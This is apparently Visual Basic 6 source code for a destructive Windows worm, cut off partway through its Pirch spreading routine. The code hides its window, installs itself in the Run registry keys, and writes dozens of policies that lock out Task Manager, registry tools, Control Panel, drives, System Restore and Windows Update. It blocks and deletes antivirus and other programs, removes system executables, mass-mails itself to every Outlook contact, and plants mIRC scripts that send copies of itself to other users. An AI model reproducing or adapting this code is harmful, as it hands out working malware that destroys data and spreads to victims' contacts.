VERSION 5.00
Begin VB.Form Form1 
   ClientHeight    =   495
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4530
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   495
   ScaleWidth      =   4530
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   4080
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Interval        =   200
      Left            =   0
      Top             =   0
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   600
      TabIndex        =   0
      Text            =   "[%Body%]"
      Top             =   120
      Width           =   3255
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
On Error Resume Next
Me.Hide
App.TaskVisible = False
windir = WinDir_func

Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", windir & "\Download" & ".exe"
Reg.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Download", windir & "\Download.exe"

Registry
Deltree
Killl
Mail
Mirc
Pirch
P2P
Copy
Site
Deactivate
CPUusage
End Sub
Private Sub Registry()
On Error Resume Next
Set wsc = CreateObject("WScript.Shell")
wsc.RegWrite "HKCU\Control Panel\Mouse\DoubleClickSpeed", "100"
wsc.RegWrite "HKCU\Control Panel\Mouse\MouseSensitivity", "5"
wsc.RegWrite "HKCU\Control Panel\Mouse\SwapMouseButtons", "1"
wsc.RegWrite "HKCU\Control Panel\Mouse\MouseSpeed", "0"
wsc.RegWrite "HKCU\Control Panel\Keyboard\KeyboardDelay", "9"
wsc.RegWrite "HKCU\Control Panel\Desktop\WheelScrollLines", "0", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", "1"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
wsc.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\NoDesktop", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDeletePrinter", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDisconnect", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDevMgrUpdate", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoVirtMemPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDevMgrPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoPwdPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSharedDocuments", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPropertiesRecycleBin", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispAppearancePage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispSettingsPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoSecCpl", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoAddPrinter", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPrinterTabs", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoProfilePage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispScrSavPage", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoThemesTab", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms", 1, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMHelp", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu", "1"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoBandCustomize", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPropertiesMyComputer", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCDBurning", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuNetworkPlaces", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNtSecurity", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideClock", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", "1"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\EnableBalloonTips", 0, "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{00020D76-0000-0000-C000-000000000046}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{645FF040-5081-101B-9F08-00AA002F954E}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{992CFFA0-F557-101A-88EC-00DD01CCC48}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{FF393560-C2A7-11CF-BFF4-444553540000}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{85BBD920-42AO-1069-A2E4-08002B30309D}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{BD84B380-8CA2-1069-AB1D-08000948534}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum\{00028B00-0000-0000-C000-000000000046}", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserClose", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFavorites", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileNew", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFindFiles", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoSelectDownloadDir", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoTheaterMode", "1", "REG_DWORD"
wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\ShowGoButton", "no"
wsc.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "1", "REG_DWORD"
'===================================================================================================================================
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", 1, "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "ddeshare.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2", "iexpress.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3", "magnify.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4", "mplay32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5", "regedt32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\6", "stinger.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\7", "wordpad.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8", "write.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9", "wmplayer.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\10", "PestPatrol.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\11", "rstrui.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\12", "accwiz.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\13", "PowerDVD.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\14", "wuauclt.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\15", "sndvol32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\16", "rtcshare.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\17", "excel.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\18", "sysedit.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\19", "wab.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\20", "msimn.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\21", "msinfo32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\22", "VB6.EXE", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\23", "migwiz.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\24", "WinRAR.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\25", "nod32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\26", "Ad-aware.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\27", "SpybotSD.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\28", "msconfig.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\29", "firefox.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\30", "cmd.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\31", "Eudora.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\32", "realplay.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\33", "cmdl32.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\34", "msn6.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\35", "tweakui.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\36", "wiaacmgr.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\37", "WinPatrol.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\38", "mozilla.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\39", "opera.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\40", "QuickTimePlayer.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\41", "mmc.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\42", "cliconfg.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\43", "progman.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\44", "cleanmgr.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\45", "ntbackup.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\46", "mobsync.exe", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\47", "dfrg.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\48", "rsop.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\49", "gpedit.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\50", "perfmon.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\51", "secpol.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\52", "services.msc", "REG_SZ"
wsc.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\53", "wmimgmt.msc", "REG_SZ"
End Sub
Private Sub Deltree()
On Error Resume Next
Dim windir As String
windir = WinDir_func
program_files = Mid$(windir, 1, 3) & "Program Files"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Microsoft Visual Studio"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Norton AntiVirus"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Adobe"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Ahead"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Winamp"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Winamp3"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Common Files"
DelTree32 Mid$(windir, 1, 3) & "Program Files\WinRAR"
DelTree32 Mid$(windir, 1, 3) & "Program Files\WinZip"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Spybot - Search & Destroy"""
DelTree32 Mid$(windir, 1, 3) & "Program Files\SpywareBlaster"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Lavasoft"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Micro DVD Player"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DivX"
DelTree32 Mid$(windir, 1, 3) & "Program Files\ESET"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Macromedia"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Executive Software"
DelTree32 Mid$(windir, 1, 3) & "Program Files\TrojanShield"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Zone Labs"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Windows Media Player"
DelTree32 Mid$(windir, 1, 3) & "Program Files\BillP Studios"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Google"
DelTree32 Mid$(windir, 1, 3) & "Program Files\MadOnion.com"
DelTree32 Mid$(windir, 1, 3) & "Program Files\AIDA32 - Enterprise System Information"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Eraser"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Ashampoo"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Customizer XP"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Alwil Software"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Grisoft"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Photodex"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Kerio"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Sygate"
DelTree32 Mid$(windir, 1, 3) & "Program Files\MailWasher Pro"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Norton Personal Firewall"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Agnitum"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Kaspersky Lab"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Sophos SWEEP for NT"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Trend Micro"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Webshots"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Windows NT"
DelTree32 Mid$(windir, 1, 3) & "Program Files\ICQ"
DelTree32 Mid$(windir, 1, 3) & "Program Files\QuickTime"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Real"
DelTree32 Mid$(windir, 1, 3) & "Program Files\RFA"
DelTree32 Mid$(windir, 1, 3) & "Program Files\TuneUp Utilities"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Download Express"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Alcohol Soft"
DelTree32 Mid$(windir, 1, 3) & "Program Files\ConvertDVD"
DelTree32 Mid$(windir, 1, 3) & "Program Files\FlashGet"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Runtime Software"
DelTree32 Mid$(windir, 1, 3) & "Program Files\GetRight"
DelTree32 Mid$(windir, 1, 3) & "Program Files\IrfanView"
DelTree32 Mid$(windir, 1, 3) & "Program Files\CyberLink"
DelTree32 Mid$(windir, 1, 3) & "Program Files\RegCleaner"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Serials 2000"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Tiny Personal Firewall"
DelTree32 Mid$(windir, 1, 3) & "Program Files\InterVideo"
DelTree32 Mid$(windir, 1, 3) & "Program Files\BSPlayer"
DelTree32 Mid$(windir, 1, 3) & "Program Files\PrivacyEraser Computing"
DelTree32 Mid$(windir, 1, 3) & "Program Files\PowerArchiver"
DelTree32 Mid$(windir, 1, 3) & "Program Files\tgtsoft"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Radmin"
DelTree32 Mid$(windir, 1, 3) & "Program Files\SecCopy"
DelTree32 Mid$(windir, 1, 3) & "Program Files\File Scavenger 2.1"
DelTree32 Mid$(windir, 1, 3) & "Program Files\NoteTab Light"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DVD2DIVXVCD"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Infiltration Systems"
DelTree32 Mid$(windir, 1, 3) & "Program Files\BinaryBiz"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Acon Digital Media"
DelTree32 Mid$(windir, 1, 3) & "Program Files\FTP Explorer"
DelTree32 Mid$(windir, 1, 3) & "Program Files\SmartPopupKiller"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Softwin"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Stardock"
DelTree32 Mid$(windir, 1, 3) & "Program Files\1st Mass Mailer"
DelTree32 Mid$(windir, 1, 3) & "Program Files\SecureCRT"
DelTree32 Mid$(windir, 1, 3) & "Program Files\NO1 CD Ripper"
DelTree32 Mid$(windir, 1, 3) & "Program Files\NO1 DVD Ripper"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DeviceLock"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Direct Folders"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Tweaking Toolbox XP"
DelTree32 Mid$(windir, 1, 3) & "Program Files\TweakNow PowerPack"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Messenger"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Activity Monitor"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Win32Pad"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Kentronix"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Panda Software"
DelTree32 Mid$(windir, 1, 3) & "Program Files\The Cleaner"
DelTree32 Mid$(windir, 1, 3) & "Program Files\McAfee"
DelTree32 Mid$(windir, 1, 3) & "Program Files\McAfee.com"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Symantec"
DelTree32 Mid$(windir, 1, 3) & "Program Files\CDex_140b9"
DelTree32 Mid$(windir, 1, 3) & "Program Files\MP3 Decoder"
DelTree32 Mid$(windir, 1, 3) & "Program Files\FreshDevices"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Evrsoft"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Pop-Up Stopper Basic"
DelTree32 Mid$(windir, 1, 3) & "Program Files\All Sound Recorder XP"
DelTree32 Mid$(windir, 1, 3) & "Program Files\AVSMedia"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DVD X Ghost"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Easy Undelete"
DelTree32 Mid$(windir, 1, 3) & "Program Files\BullGuard"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Security Scanner"
DelTree32 Mid$(windir, 1, 3) & "Program Files\ZipScanEval"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Tweak-XP Pro 3"
DelTree32 Mid$(windir, 1, 3) & "Program Files\HTML Builder Pro"
DelTree32 Mid$(windir, 1, 3) & "Program Files\IRCXpro Messenger"
DelTree32 Mid$(windir, 1, 3) & "Program Files\SiSoftware"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Powerbullet"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Easy CD-DA Extractor 6"
DelTree32 Mid$(windir, 1, 3) & "Program Files\PestPatrol"
DelTree32 Mid$(windir, 1, 3) & "Program Files\SpyKiller"
DelTree32 Mid$(windir, 1, 3) & "Program Files\HistoryKill"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Microsoft ActiveSync"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Microsoft Windows Small Business Server"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Microsoft.NET"
DelTree32 Mid$(windir, 1, 3) & "Program Files\f-prot95"
DelTree32 Mid$(windir, 1, 3) & "Program Files\f-prot"
DelTree32 Mid$(windir, 1, 3) & "Program Files\avpersonal"
DelTree32 Mid$(windir, 1, 3) & "Program Files\tbscan"
DelTree32 Mid$(windir, 1, 3) & "Program Files\tbav"
DelTree32 Mid$(windir, 1, 3) & "Program Files\1st TurboRun"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Visiosonic"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DVDx"
DelTree32 Mid$(windir, 1, 3) & "Program Files\AVI MPEG RM WMV Joiner"
DelTree32 Mid$(windir, 1, 3) & "Program Files\AVI MPEG ASF WMV Splitter"
DelTree32 Mid$(windir, 1, 3) & "Program Files\Super DVD Ripper"
DelTree32 Mid$(windir, 1, 3) & "Program Files\DVD Shrink"
End Sub
Private Sub Killl()
On Error Resume Next
Dim windir As String
windir = WinDir_func
Kill windir & "\notepad.exe"
Kill windir & "\system32\notepad.exe"
Kill windir & "\system32\calc.exe"
Kill windir & "\system32\osk.exe"
Kill windir & "\system32\telnet.exe"
Kill windir & "\system32\shrpubw.exe"
Kill windir & "\system32\mspaint.exe"
Kill windir & "\system32\narrator.exe"
Kill windir & "\system32\rasphone.exe"
Kill windir & "\system32\wupdmgr.exe"
End Sub
Private Sub Mail()
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If Not OutlookApp = "" Then
For Each ContactSwitch In OutlookApp.GetNameSpace("MAPI").AddressLists
For UserGroup = 1 To ContactSwitch.AddressEntries.Count
Set OutlookEmail = OutlookApp.CreateItem(0)
OutlookEmail.Recipients.Add ContactSwitch.AddressEntries(UserGroup)
OutlookEmail.Subject = "Check this out!"
OutlookEmail.Body = "Look at the file in the attachments, It's great! :P"
OutlookEmail.Attachments.Add WScript.ScriptFullName
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Send
Next
Next
End If
End Sub
Private Sub Mirc()
On Error Resume Next
MkDir "C:\mIRC"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\mIRC\mIRC.scr"
Open "C:\mIRC\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n1=on 1:JOIN:#:{"
Print #1, "n2= /if ( $nick == $me ) { halt }"
Print #1, "n3= /msg $nick Hi!I know all yours secrets!Check this file!"
Print #1, "n4= /dcc send -c $nick " & pOX & "\mIRC.scr"
Print #1, "n5= }"
Close 1
End Sub
Private Sub Pirch()
On Error Resume Next
MkDir "C:\Pirch"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Pirch\Pirch2.scr"
Open "C:\Pirch\events.ini" For Output As 1
Print #1, "[Levels]"
Print #1, "Enabled=1"
Print #1, "Count=6"
Print #1, "Level1=000-Unknowns"
Print #1, "000-UnknownsEnabled=1"
Print #1, "Level2=100-Level 100"
Print #1, "100-Level 100Enabled=1"
Print #1, "Level3=200-Level 200"
Print #1, "200-Level 200Enabled=1"
